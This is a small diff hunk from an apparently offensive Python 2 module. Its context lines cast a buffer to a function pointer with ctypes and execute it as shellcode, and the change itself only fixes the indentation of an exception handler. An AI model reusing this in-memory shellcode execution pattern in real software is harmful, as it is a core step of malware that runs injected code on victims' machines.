@@ -14,7 +14,7 @@ def run(**args):
       launch_func   = ctypes.cast(launch_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
 
       shellcode_func()
-        except Exception, e:
-          return str(e)
+  except Exception, e:
+      return str(e)
   
   
